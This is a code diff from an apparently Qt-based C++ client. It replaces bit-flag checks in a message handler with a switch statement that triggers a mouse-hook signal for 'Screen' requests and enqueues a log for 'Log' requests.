@@ -137,17 +137,20 @@ void Client::getString(const QString &string, const QString& /* ip */)
         filesStr.remove(0, colonPos+1);
 
         QString currentFile = filesStr.section('|', 0, 0);
-        quint16 files = currentFile.toInt();
+        int files = currentFile.toInt();
 
-        if (files & Screen)
+        switch (files)
         {
+        case int(Files::Screen):
             emit MouseHook::instance().mouseClicked();
+            break;
+        case int (Files::Log):
+            enqueueLog();
+            break;
+        default:
+            break;
         }
 
-        if (files & Log)
-        {
-            enqueueLog();
-        }
 /*
         //Look for all files in string
         currentFile = filesStr.section('|', 1, 1, QString::SectionSkipEmpty);
